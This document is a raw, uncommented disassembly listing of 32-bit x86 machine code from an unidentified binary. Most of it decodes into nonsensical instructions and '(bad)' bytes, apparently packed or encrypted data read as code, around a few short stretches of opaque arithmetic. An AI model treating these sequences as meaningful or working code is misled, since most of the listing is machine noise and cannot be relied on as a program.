  409286:	push   0xffffff92
  409288:	call   0x5758:0xd25d1e26
  40928f:	loop   0x40928a
  409291:	outs   dx,BYTE PTR ds:[esi]
  409292:	repnz sub DWORD PTR [edi+0x2b],edi
  409296:	push   esp
  409297:	dec    eax
  409298:	push   ecx
  409299:	leave  
  40929a:	xchg   ebx,esi
  40929c:	loop   0x409226
  40929e:	je     0x409223
  4092a0:	pop    esi
  4092a1:	aam    0x67
  4092a3:	loope  0x409312
  4092a5:	sbb    al,0x8c
  4092a7:	sub    DWORD PTR [eax-0x3d],ebx
  4092aa:	outs   dx,DWORD PTR ds:[esi]
  4092ab:	es (bad) 
  4092ad:	mov    bh,BYTE PTR [edx-0x7f]
  4092b0:	sahf   
  4092b1:	xor    esi,0x24
  4092b4:	inc    esi
  4092b5:	test   DWORD PTR [ebx+0xd1deead],0x48b76606
  4092bf:	hlt    
  4092c0:	mov    eax,es:0x21010bd2
  4092c6:	xor    DWORD PTR [edi],0xffffffc6
  4092c9:	loopne 0x40928c
  4092cb:	push   esp
  4092cc:	pop    esp
  4092cd:	push   es
  4092ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092cf:	or     ch,BYTE PTR [ebx-0x3c1ff28]
  4092d5:	mov    DWORD PTR [esi+0x6fdde28a],esi
  4092db:	xchg   ebx,eax
  4092dc:	pop    edi
  4092dd:	aam    0x99
  4092df:	test   al,0xd8
  4092e1:	and    eax,0xda995e4f
  4092e6:	xchg   esp,eax
  4092e7:	inc    edx
  4092e8:	lea    edi,[eax]
  4092ea:	dec    ecx
  4092eb:	xor    dl,bl
  4092ed:	add    DWORD PTR [edx+0x58],ebp
  4092f0:	push   es
  4092f1:	and    eax,edx
  4092f3:	fwait
  4092f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092f5:	ins    BYTE PTR es:[edi],dx
  4092f6:	jno    0x409280
  4092f8:	add    al,0x46
  4092fa:	jge    0x40929c
  4092fc:	pop    ds
  4092fd:	inc    edx
  4092fe:	xlat   BYTE PTR ds:[ebx]
  4092ff:	je     0x409295
  409301:	push   DWORD PTR [eax]
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	mov    ah,0x32
  40932f:	mov    eax,0x70e227a8
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x40939f
  40933a:	out    0x22,eax
  40933c:	xchg   ebx,eax
  40933d:	aam    0xa0
  40933f:	mov    bh,BYTE PTR [eax]
  409341:	cmp    al,0xa3
  409343:	fmulp  st(0),st
  409346:	adc    BYTE PTR ds:0xa62bf6e2,ch
  40934c:	mov    eax,0xc6446e15
  409351:	sub    al,0x19
  409353:	fst    QWORD PTR [esi+0x56]
  409356:	stos   DWORD PTR es:[edi],eax
  409357:	pushf  
  409358:	dec    ecx
  409359:	scas   eax,DWORD PTR es:[edi]
  40935a:	ficom  WORD PTR [edx]
  40935c:	pop    ebp
  40935d:	or     bh,BYTE PTR [ebp+0xdefc53]
  409363:	fistp  DWORD PTR [ebx-0x41397051]
  409369:	jmp    0x40932f
  40936b:	push   esp
  40936c:	int3   
  40936d:	push   0xffffffc9
  40936f:	outs   dx,DWORD PTR ds:[esi]
  409370:	cmp    edi,edi
  409372:	jae    0x409397
  409374:	jb     0x409353
  409376:	mov    ebp,0x8e480284
  40937b:	neg    ebp
  40937d:	scas   eax,DWORD PTR es:[edi]
  40937e:	ins    BYTE PTR es:[edi],dx
  40937f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409380:	mov    eax,ds:0xf3da1970
  409385:	sbb    eax,0x58d19aa4
  40938a:	push   esp
  40938b:	(bad)  
  40938c:	call   0x73091a44
  409391:	stos   BYTE PTR es:[edi],al
  409392:	xlat   BYTE PTR ds:[ebx]
  409393:	jno    0x409376
  409395:	fdiv   DWORD PTR [edx]
  409397:	fnstsw WORD PTR [eax]
  409399:	adc    al,0x6
  40939b:	mov    ecx,0x24d11169
  4093a0:	dec    ebp
  4093a1:	test   al,0xee
  4093a3:	enter  0x90a8,0x6c
  4093a7:	stos   DWORD PTR es:[edi],eax
  4093a8:	inc    edi
  4093a9:	fs fdivp st(0),st
  4093ac:	in     eax,0x1d
  4093ae:	pop    ebx
  4093af:	int    0xe6
  4093b1:	loope  0x409391
  4093b3:	in     eax,0x8e
  4093b5:	and    bh,BYTE PTR [edx-0x49]
  4093b8:	icebp  
  4093b9:	loope  0x409342
  4093bb:	(bad)  
  4093bc:	(bad)  
  4093bd:	push   edx
  4093be:	sbb    esp,ebp
  4093c0:	mov    al,0xb3
  4093c2:	inc    esi
  4093c3:	inc    ecx
  4093c4:	mov    ebp,0xe7740171
  4093c9:	mov    eax,ds:0x8d707199
  4093ce:	(bad)  
  4093cf:	ret    0xf423
  4093d2:	jecxz  0x409433
  4093d4:	xchg   edx,eax
  4093d5:	sub    BYTE PTR [edx],dh
  4093d7:	in     al,0x44
  4093d9:	jo     0x4093bd
  4093db:	push   ecx
  4093dc:	dec    eax
  4093dd:	cmc    
  4093de:	or     BYTE PTR [ecx-0x6c],dl
  4093e1:	mov    bh,BYTE PTR [edi+ecx*4+0x52aae228]
  4093e8:	std    
  4093e9:	push   es
  4093ea:	dec    ebp
  4093eb:	mov    ds:0xacc7c98,eax
  4093f0:	and    ch,ch
  4093f2:	or     al,0x5
  4093f4:	or     bh,bl
  4093f6:	(bad)  
  4093f7:	lea    esp,[ecx]
  4093f9:	mov    bl,0x9f
  4093fb:	ror    DWORD PTR [esi-0x4660fdf7],cl
  409401:	retf   0x3d1e
  409404:	addr16 jbe 0x409462
  409407:	icebp  
  409408:	xor    dh,cl
  40940a:	ins    BYTE PTR es:[edi],dx
  40940b:	fnstenv [esi]
  40940d:	mov    ds:0xeae77e61,al
  409412:	stos   BYTE PTR es:[edi],al
  409413:	ftst   
  409415:	rcl    DWORD PTR [ebp+0x79352e08],1
  40941b:	and    edx,DWORD PTR [eax+0x7d]
  40941e:	imul   esi,DWORD PTR [ebp-0x46],0x6e047bdb
  409425:	add    eax,0xbf40643a
  40942a:	inc    edx
  40942b:	out    0xbb,eax
  40942d:	jle    0x409413
  40942f:	pop    edx
  409430:	mov    bl,0x59
  409432:	fs inc edx
  409434:	push   0x23
  409436:	leave  
  409437:	and    edx,edi
  409439:	jmp    0x2b50:0x43ba0bf1
  409440:	mov    ebp,0x2f5fbed8
  409445:	pop    esi
  409446:	retf   
  409447:	lds    ecx,FWORD PTR [esi+0x14d10bb9]
  40944d:	push   ebx
  40944e:	mov    DWORD PTR [ebx+ecx*4-0x225f8e17],eax
  409455:	fimul  WORD PTR [edx-0x2b03d409]
  40945b:	xor    al,BYTE PTR [ebp+0x18]
  40945e:	popa   
  40945f:	dec    ebp
  409460:	sbb    DWORD PTR [edi+0x3f946b74],eax
  409466:	icebp  
  409467:	xor    dh,BYTE PTR [ebp+0x41217e30]
  40946d:	dec    DWORD PTR [ebp+0x6e990d1b]
  409473:	test   al,0x9a
  409475:	cli    
  409476:	xor    cl,BYTE PTR [edx]
  409478:	mov    BYTE PTR [ecx-0x5a],al
  40947b:	and    esi,0xffffffcd
  40947e:	clc    
  40947f:	push   ss
  409480:	mov    al,0x13
  409482:	add    DWORD PTR [edx+0x161a4a00],esp
  409488:	je     0x40947b
  40948a:	adc    BYTE PTR [edx+0x7f4cdcb7],dh
  409490:	dec    ebx
  409491:	gs pop es
  409493:	dec    ebp
  409494:	sbb    DWORD PTR [edi+0x4e],0x3a
  409498:	jae    0x409453
  40949a:	sub    eax,0x34e0bb
  40949f:	test   al,0xb4
  4094a1:	nop
  4094a2:	jne    0x4094d8
  4094a4:	int3   
  4094a5:	and    BYTE PTR [esi+eax*2-0x61],ch
  4094a9:	outs   dx,BYTE PTR ds:[esi]
  4094aa:	leave  
  4094ab:	sbb    bh,cl
  4094ad:	rol    DWORD PTR [ebp+0x6e20d6be],1
  4094b3:	gs inc eax
  4094b5:	push   ds
  4094b6:	call   0xcc4498f
  4094bb:	inc    ecx
  4094bc:	or     ecx,DWORD PTR [edx]
  4094be:	xchg   DWORD PTR [ebp+0x31f21e91],edi
  4094c4:	stos   BYTE PTR es:[edi],al
  4094c5:	iret   
  4094c6:	mov    edx,DWORD PTR [edx-0x7b]
  4094c9:	lods   eax,DWORD PTR ds:[esi]
  4094ca:	jl     0x4094c5
  4094cc:	mov    edx,0xac7b0257
  4094d1:	rol    DWORD PTR [esi+0x35],cl
  4094d4:	jo     0xd2526649
  4094da:	dec    edx
  4094db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094dc:	inc    ebp
  4094dd:	and    ecx,0x75
  4094e0:	xor    BYTE PTR [edi],al
  4094e2:	(bad)  
  4094e3:	sti    
  4094e4:	mov    bl,0xe3
  4094e6:	retf   
  4094e7:	adc    esi,DWORD PTR ds:0xec565850
  4094ed:	in     eax,dx
  4094ee:	in     al,0xf2
  4094f0:	aad    0x2b
  4094f2:	push   ebx
  4094f3:	outs   dx,DWORD PTR ds:[esi]
  4094f4:	jo     0x4094dd
  4094f6:	jb     0x409554
  4094f8:	int    0x6d
  4094fa:	cmp    DWORD PTR [eax],edi
  4094fc:	scas   al,BYTE PTR es:[edi]
  4094fd:	mov    ecx,0xc06e0b1c
  409502:	shl    DWORD PTR [edi-0x39e5a73f],1
  409508:	outs   dx,DWORD PTR ds:[esi]
  409509:	pusha  
  40950a:	sub    eax,0xd646cbbd
  40950f:	pop    ss
  409510:	scas   al,BYTE PTR es:[edi]
  409511:	dec    edx
  409512:	lods   al,BYTE PTR ds:[esi]
  409513:	dec    eax
  409514:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409515:	mov    eax,0x8605420b
  40951a:	pop    ss
  40951b:	jns    0x40958b
  40951d:	dec    edx
  40951e:	xlat   BYTE PTR ds:[ebx]
  40951f:	inc    ecx
  409520:	fnstsw WORD PTR [edx-0x5a]
  409523:	in     al,dx
  409524:	add    DWORD PTR [edx-0x4478db65],edi
  40952a:	sbb    BYTE PTR [ecx+0x56],dl
  40952d:	imul   ebx,DWORD PTR [eax-0x53129ff1],0x5bb219a5
  409537:	mov    WORD PTR gs:[ecx],?
  40953a:	out    dx,eax
  40953b:	jae    0x409528
  40953d:	mov    ecx,ebx
  40953f:	rcr    DWORD PTR [esi+edi*4-0x54],1
  409543:	push   eax
  409544:	push   ebx
  409545:	popf   
  409546:	jb     0x40955c
  409548:	sahf   
  409549:	or     al,0x4c
  40954b:	cli    
  40954c:	(bad)  
  40954d:	xchg   edi,eax
  40954e:	adc    eax,0xde3218c1
  409553:	leave  
  409554:	dec    ecx
  409555:	pop    ecx
  409556:	mov    ah,0x8f
  409558:	and    eax,0x15dac042
  40955d:	sahf   
  40955e:	pop    ds
  40955f:	cmp    BYTE PTR [ecx+0xc53d4ab],ch
  409565:	add    al,0x5f
  409567:	push   ds
  409568:	in     al,0xb3
  40956a:	js     0x40957c
  40956c:	cld    
  40956d:	sti    
  40956e:	mov    al,ds:0xb9590d8f
  409573:	sub    BYTE PTR [ecx+eax*2+0x5b],al
  409577:	mov    ds:0xb40cf153,eax
  40957c:	and    dh,BYTE PTR ds:0x6c990e32
  409582:	mov    ds:0xdea7cb60,al
  409587:	xchg   ebx,eax
  409588:	(bad)  
  409589:	(bad)  
  40958a:	sub    ecx,edi
  40958c:	lea    ecx,[ecx+0x78]
  40958f:	cmc    
  409590:	jmp    FWORD PTR [ecx]
  409592:	addr16 mov edx,0x68dd90a7
  409598:	and    BYTE PTR [ecx+0x49804932],bl
  40959e:	push   0x682bf396
  4095a3:	xor    BYTE PTR [edi],cl
  4095a5:	mov    esp,0xc5626223
  4095aa:	loop   0x409628
  4095ac:	mov    bh,0xdb
  4095ae:	scas   al,BYTE PTR es:[edi]
  4095af:	cdq    
  4095b0:	add    bh,cl
  4095b2:	inc    esp
  4095b3:	adc    cl,BYTE PTR [edi]
  4095b5:	xor    esi,DWORD PTR [edi-0x2c]
  4095b8:	pop    eax
  4095b9:	sub    DWORD PTR [eax],ebp
  4095bb:	add    esp,DWORD PTR [ebp+edx*2+0x272defd0]
  4095c2:	dec    eax
  4095c3:	and    esi,DWORD PTR [eax+edx*1]
  4095c6:	clc    
  4095c7:	rcl    BYTE PTR [eax+eax*4+0x17],0x2a
  4095cc:	mov    bl,ch
  4095ce:	test   DWORD PTR [ebp+0x6ee124e9],esp
  4095d4:	adc    al,0x15
  4095d6:	cmp    ch,BYTE PTR [ebx]
  4095d8:	in     ax,dx
  4095da:	(bad)  
  4095db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095dc:	inc    edi
  4095dd:	fiadd  DWORD PTR [ebp+0x19459457]
  4095e3:	mov    dh,0x3f
  4095e5:	push   cs
  4095e6:	cmp    DWORD PTR ds:[ebx+eiz*8-0x2],esp
  4095eb:	xor    bx,WORD PTR [edi]
  4095ee:	and    DWORD PTR [eax+0x21],ecx
  4095f1:	jp     0x409620
  4095f3:	and    esi,DWORD PTR [edx]
  4095f5:	dec    eax
  4095f6:	push   cs
  4095f7:	es je  0x40963a
  4095fa:	add    edx,DWORD PTR [esi+edx*2+0x71131724]
  409601:	mov    bl,0xd5
  409603:	test   dh,dh
  409605:	jp     0x409643
  409607:	popf   
  409608:	dec    eax
  409609:	adc    BYTE PTR [edx],al
  40960b:	mov    gs,WORD PTR [edx+0x6e543002]
  409611:	sbb    BYTE PTR [ebx-0x35],dh
  409614:	out    0xc,al
  409616:	mov    al,ds:0x1f4c8ca8
  40961b:	clc    
  40961c:	out    0xf2,eax
  40961e:	out    0x82,eax
  409620:	shl    bh,1
  409622:	cs add al,0x11
  409625:	mov    edx,0x7ae533d3
  40962a:	fs push edi
  40962c:	loope  0x4096ac
  40962e:	outs   dx,BYTE PTR ds:[esi]
  40962f:	das    
  409630:	or     ebx,DWORD PTR [esp+edi*4]
  409633:	and    eax,0x8587ddc1
  409638:	inc    edx
  409639:	stos   DWORD PTR es:[edi],eax
  40963a:	cmp    eax,0x137b82c6
  40963f:	loop   0x40963d
  409641:	jno    0x4096c0
  409643:	mov    al,ah
  409645:	pop    ecx
  409646:	daa    
  409647:	call   0xfe26:0xdb5c
  40964d:	std    
  40964e:	out    dx,al
  40964f:	ss std 
  409651:	push   esi
  409652:	push   ebx
  409653:	retf   0x8ab0
  409656:	loopne 0x4095f9
  409658:	in     al,0x2b
  40965a:	add    edx,DWORD PTR [edi]
  40965c:	mov    es,WORD PTR [eax+0x43]
  40965f:	push   eax
  409660:	int    0xe6
  409662:	pushf  
  409663:	jmp    0xa4cf1ff1
  409668:	add    bh,bh
  40966a:	push   eax
  40966b:	add    DWORD PTR [ebx+0xd8be045],ecx
  409671:	and    al,0xb2
  409673:	inc    ecx
  409674:	add    cl,ch
  409676:	dec    eax
  409677:	add    eax,DWORD PTR [eax]
  409679:	add    bh,ch
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [ecx+edi*2+0x1d],eax
  409689:	dec    ebp
  40968a:	xlat   BYTE PTR ds:[ebx]
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x4096bd
  409693:	jmp    0x21e8a98f
  409698:	int3   
  409699:	push   0x78c41caa
  40969e:	rcr    bl,1
  4096a0:	sar    BYTE PTR [ebx+0x38ba6d59],cl
  4096a6:	bound  esi,QWORD PTR [esi]
  4096a8:	inc    edi
  4096a9:	mul    DWORD PTR [edi+0x20]
  4096ac:	lods   eax,DWORD PTR ds:[esi]
  4096ad:	icebp  
  4096ae:	mov    bh,0x3a
  4096b0:	xor    DWORD PTR [eax+0x29],0x4f
  4096b4:	fld    QWORD PTR [ebp+0x6f]
  4096b7:	ja     0x409688
  4096b9:	mov    ecx,0x4f5811cb
  4096be:	inc    esi
  4096bf:	jmp    0xf98bdb18
  4096c4:	fs jbe 0x409726
  4096c7:	and    ecx,DWORD PTR [edx]
  4096c9:	scas   al,BYTE PTR es:[edi]
  4096ca:	jb     0x40973b
  4096cc:	jmp    0x66f4364f
  4096d1:	sbb    al,0xc7
  4096d3:	std    
  4096d4:	push   ds
  4096d5:	pop    edi
  4096d6:	inc    eax
  4096d7:	das    
  4096d8:	iret   
  4096d9:	sub    edi,DWORD PTR [ecx]
  4096db:	in     al,0x70
  4096dd:	out    dx,eax
  4096de:	fcom   DWORD PTR [esi+eiz*1-0x7f70d7e8]
  4096e5:	push   eax
  4096e6:	idiv   DWORD PTR [esi-0x75]
  4096e9:	rcr    ebp,1
  4096eb:	jns    0x409689
  4096ed:	pop    eax
  4096ee:	adc    BYTE PTR [eax+0x2a8436b0],ah
  4096f4:	lea    edx,[ecx-0x33]
  4096f7:	retf   0xf068
  4096fa:	mov    eax,0xa93d950d
  4096ff:	gs aas 
  409701:	sub    edx,DWORD PTR [esi-0x4a]
  409704:	dec    ebp
  409705:	aad    0xf9
  409707:	(bad)  
  409708:	inc    esp
  409709:	jp     0x409718
  40970b:	cmp    edi,DWORD PTR [eax+edi*2]
  40970e:	retf   0x7ddc
  409711:	sbb    DWORD PTR [esi-0x7a],0x34a3677a
  409718:	mov    dl,0x3d
  40971a:	sbb    ecx,DWORD PTR [edx-0x28]
  40971d:	inc    esi
  40971e:	out    0x1b,eax
  409720:	fsubr  QWORD PTR [esi]
  409722:	jecxz  0x4096bf
  409724:	hlt    
  409725:	mov    edi,0x7fad3751
  40972a:	inc    edx
  40972b:	outs   dx,BYTE PTR ds:[esi]
  40972c:	int3   
  40972d:	xor    ebp,DWORD PTR [eax+0x4cccf87b]
  409733:	out    dx,al
  409734:	pop    ebx
  409735:	(bad)  
  409736:	adc    DWORD PTR [ebp+ecx*2+0x2caefc59],edx
  40973d:	icebp  
  40973e:	ficomp DWORD PTR [ecx-0x7e]
  409741:	mov    ebx,0x8349dab8
  409746:	mov    edi,gs
  409748:	push   cs
  409749:	jbe    0x40976f
  40974b:	sub    BYTE PTR [ebx],dl
  40974d:	imul   ecx,DWORD PTR [esi],0xe
  409750:	adc    eax,0x3f249b4
  409755:	jle    0x409721
  409757:	push   edi
  409758:	push   eax
  409759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40975a:	sbb    DWORD PTR [esi],0xffffffcf
  40975d:	push   0xffffffd4
  40975f:	dec    esi
  409760:	jle    0x4097cc
  409762:	sbb    DWORD PTR [ebx-0x1b33a428],0x3c
  409769:	cld    
  40976a:	push   ebp
  40976b:	sub    eax,0x2d7007f3
  409770:	or     DWORD PTR [edi-0x19],edx
  409773:	dec    ecx
  409774:	hlt    
  409775:	ror    bl,cl
  409777:	imul   DWORD PTR [edx-0x33]
  40977a:	out    0x78,eax
  40977c:	xor    ah,BYTE PTR [ecx+ecx*2-0x4523c3df]
  409783:	rcr    DWORD PTR [ebp+0x193f19cf],cl
  409789:	jl     0x40978b
  40978b:	aam    0xb1
  40978d:	je     0x4097b2
  40978f:	fidiv  WORD PTR [ebp+0x79]
  409792:	push   ebx
  409793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409794:	je     0x4097f1
  409796:	lock cld 
  409798:	sbb    al,0x52
  40979a:	outs   dx,DWORD PTR ds:[esi]
  40979b:	ins    DWORD PTR es:[edi],dx
  40979c:	lea    ebx,[edi-0x65]
  40979f:	sbb    eax,0x34a5de75
  4097a4:	loope  0x4097e5
  4097a6:	sub    cl,al
  4097a8:	dec    ebx
  4097a9:	xor    ch,dl
  4097ab:	sahf   
  4097ac:	jp     0x40978e
  4097ae:	mov    esi,0x4360a695
  4097b3:	es daa 
  4097b5:	rcl    ebx,1
  4097b7:	mov    cl,0x73
  4097b9:	dec    ebp
  4097ba:	mov    eax,0xa5982308
  4097bf:	cpuid  
  4097c1:	sar    BYTE PTR [edx],0x84
  4097c4:	call   0x7388:0xbd2748e0
  4097cb:	mov    BYTE PTR [ebx+eax*1],ah
  4097ce:	pushf  
  4097cf:	aaa    
  4097d0:	mov    ebx,0x4914a3a0
  4097d5:	mov    dh,0x4d
  4097d7:	add    al,0x92
  4097d9:	hlt    
  4097da:	(bad)  
  4097db:	loop   0x4097a5
  4097dd:	cmp    BYTE PTR [edx+0x570051b8],al
  4097e3:	sbb    ecx,DWORD PTR [edi*2-0x3ba84515]
  4097ea:	stos   BYTE PTR es:[edi],al
  4097eb:	jge    0x40983b
  4097ed:	cli    
  4097ee:	xor    DWORD PTR [edi+ecx*1],edx
  4097f1:	and    ah,BYTE PTR [edi-0x45]
  4097f4:	sub    DWORD PTR [edi+0x341d8f19],esp
  4097fa:	xchg   esp,eax
  4097fb:	addr16 xchg edx,eax
  4097fd:	mov    al,0x36
  4097ff:	aas    
  409800:	jecxz  0x40979a
  409802:	mov    ds:0x90f723ee,eax
  409807:	or     dh,BYTE PTR [edx+ebx*1-0x13]
  40980b:	mov    dh,0x23
  40980d:	(bad)  
  40980f:	int3   
  409810:	inc    ebp
  409811:	mov    ah,0x78
  409813:	fsub   DWORD PTR [ecx-0x60cd3fc5]
  409819:	xchg   DWORD PTR [edi+0x724e2b36],edi
  40981f:	outs   dx,BYTE PTR ds:[esi]
  409820:	mov    al,0xec
  409822:	or     ebx,DWORD PTR [edi]
  409824:	mov    esi,0xd19d6906
  409829:	sub    al,0xbc
  40982b:	sbb    cl,dh
  40982d:	push   ebp
  40982e:	pushf  
  40982f:	push   edi
  409830:	or     eax,0x53287b88
  409835:	ds stc 
  409837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409838:	(bad)  
  40983a:	dec    ebx
  40983b:	cmc    
  40983c:	inc    eax
  40983d:	aaa    
  40983e:	mov    ds:0x394660c1,al
  409843:	jg     0x40986a
  409845:	(bad)  
  409846:	fs sub al,0xcf
  409849:	sub    DWORD PTR [edi],edx
  40984b:	mov    BYTE PTR [edx+0x1788fd20],ch
  409851:	pop    eax
  409852:	mov    eax,ds:0xbe01da20
  409857:	and    eax,0x58b541b3
  40985c:	mov    cl,0x37
  40985e:	xchg   ecx,eax
  40985f:	loopne 0x4097f9
  409861:	sahf   
  409862:	jg     0x409823
  409864:	lds    eax,FWORD PTR [bp+di]
  409867:	bound  esp,QWORD PTR cs:[esi]
  40986a:	sub    al,0x95
  40986c:	in     al,dx
  40986d:	cmp    al,0x80
  40986f:	inc    ebp
  409870:	mov    eax,ds:0xf8e20f62
  409875:	stos   BYTE PTR es:[edi],al
  409876:	out    dx,eax
  409877:	push   ebp
  409878:	push   ebp
  409879:	sti    
  40987a:	xor    edx,DWORD PTR ds:0xf6035a52
  409880:	(bad)  
  409881:	jmp    0x8f1:0xe158db42
  409888:	adc    ebx,ebp
  40988a:	pop    esp
  40988b:	addr16 xchg edi,eax
  40988d:	xchg   esi,eax
  40988e:	ret    
  40988f:	(bad)  
  409890:	and    al,0x26
  409892:	mov    al,0x11
  409894:	loopne 0x409877
  409896:	dec    esi
  409897:	dec    ebx
  409898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409899:	sbb    BYTE PTR [eax+ecx*4+0x7fb0b1d0],ah
  4098a0:	jb     0x4098c2
  4098a2:	test   eax,0xf1e359c0
  4098a7:	popfw  
  4098a9:	xchg   edi,eax
  4098aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098ab:	adc    BYTE PTR ds:0xac15e49c,cl
  4098b1:	imul   ebx,DWORD PTR [eax+0x53],0x4b427ef4
  4098b8:	dec    ecx
  4098b9:	pop    eax
  4098ba:	sbb    bh,BYTE PTR [edx]
  4098bc:	pop    esp
  4098bd:	adc    DWORD PTR [esi],esi
  4098bf:	push   ss
  4098c0:	mov    bl,0x59
  4098c2:	mov    ds:0xd0b01779,eax
  4098c7:	sub    ecx,ebp
  4098c9:	sub    eax,0x7ecf164b
  4098ce:	scas   eax,DWORD PTR es:[edi]
  4098cf:	adc    bh,al
  4098d1:	and    BYTE PTR [edx+0x7e],0xc3
  4098d5:	(bad)  
  4098d6:	in     eax,dx
  4098d7:	(bad)  
  4098d8:	jnp    0x4098fd
  4098da:	lods   eax,DWORD PTR ds:[esi]
  4098db:	dec    ecx
  4098dc:	(bad)  
  4098dd:	out    0x12,al
  4098df:	idiv   al
  4098e1:	push   esi
  4098e2:	push   ds
  4098e3:	mov    dh,0xa4
  4098e5:	sti    
  4098e6:	mov    BYTE PTR [esi-0x2a553e1a],cl
  4098ec:	adc    DWORD PTR [eax-0x28],0x1d93ae97
  4098f3:	iret   
  4098f4:	mov    edi,0x2454944b
  4098f9:	inc    edx
  4098fa:	mov    al,0x1f
  4098fc:	ins    DWORD PTR es:[edi],dx
  4098fd:	cld    
  4098fe:	inc    ebp
  4098ff:	xchg   DWORD PTR [eax+0x5ad3c050],eax
  409905:	mov    ds:0xb765ac3,al
  40990a:	ins    DWORD PTR es:[edi],dx
  40990b:	imul   ebp,DWORD PTR [ebp-0x2ba8a3e9],0x20d597e
  409915:	add    BYTE PTR [edi],0xee
  409918:	dec    edx
  409919:	or     DWORD PTR [ecx],ebp
  40991b:	lahf   
  40991c:	sub    BYTE PTR [eax-0x56],0xe6
  409920:	test   al,0x40
  409922:	lods   al,BYTE PTR ds:[esi]
  409923:	stc    
  409924:	xor    esi,DWORD PTR [esi-0x15235033]
  40992a:	aaa    
  40992b:	sahf   
  40992c:	cmp    ah,al
  40992e:	push   ebp
  40992f:	push   edx
  409930:	js     0x40998d
  409932:	xchg   esp,eax
  409933:	fwait
  409934:	inc    ebx
  409935:	adc    ebx,DWORD PTR [ecx]
  409937:	or     bh,BYTE PTR [eax-0x5e7fc7ff]
  40993d:	xor    DWORD PTR [ebx-0xb4ca06f],esi
  409943:	lods   al,BYTE PTR ds:[esi]
  409944:	dec    esi
  409945:	mov    al,ds:0xcf4bb4d2
  40994a:	jmp    DWORD PTR [esi+0xf]
  40994d:	add    al,0x11
  40994f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409950:	push   eax
  409951:	push   ss
  409952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409953:	mov    eax,0x255da9f3
  409958:	idiv   DWORD PTR [edx-0x6522e736]
  40995e:	xchg   DWORD PTR [edi-0x5d9aee0d],ebp
  409964:	push   0xdb5dc2b5
  409969:	stos   BYTE PTR es:[edi],al
  40996a:	(bad)
  40996e:	imul   edx,DWORD PTR [esi+0x22ef6158],0xeb5d10c4
  409978:	repz inc ecx
  40997a:	in     eax,0xa0
  40997c:	mov    ah,0x2b
  40997e:	push   ebx
  40997f:	daa    
  409980:	(bad)  
  409981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409982:	out    0x77,eax
  409984:	push   ebp
  409985:	xlat   BYTE PTR ds:[ebx]
  409986:	fcomp  QWORD PTR [ecx-0x16]
  409989:	cmp    al,0x58
  40998b:	cmp    al,0x59
  40998d:	push   edi
  40998e:	repnz cmp al,0x30
  409991:	xchg   BYTE PTR [edi+0x533f3f69],ah
  409997:	add    eax,0xb41205b2
  40999c:	repnz sub bh,BYTE PTR [ebp+0x72]
  4099a0:	dec    ebx
  4099a1:	mov    ds:0xfbb65d1a,eax
  4099a6:	adc    bh,bl
  4099a8:	inc    ecx
  4099a9:	test   BYTE PTR [eax-0x56],bh
  4099ac:	cmp    ebx,DWORD PTR [ecx]
  4099ae:	lds    edi,FWORD PTR [esi+ecx*2+0xe]
  4099b2:	rcr    esi,1
  4099b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099b5:	cmp    al,0x57
  4099b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099b8:	sbb    BYTE PTR [ebp-0x54],dl
  4099bb:	shr    DWORD PTR [edi+0x7d],cl
  4099be:	sahf   
  4099bf:	push   ecx
  4099c0:	mov    WORD PTR [esi],?
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fe0a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e19c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e317
  4099eb:	mov    edi,DWORD PTR ds:0x42e327
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e81c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e1a4,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fd79,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
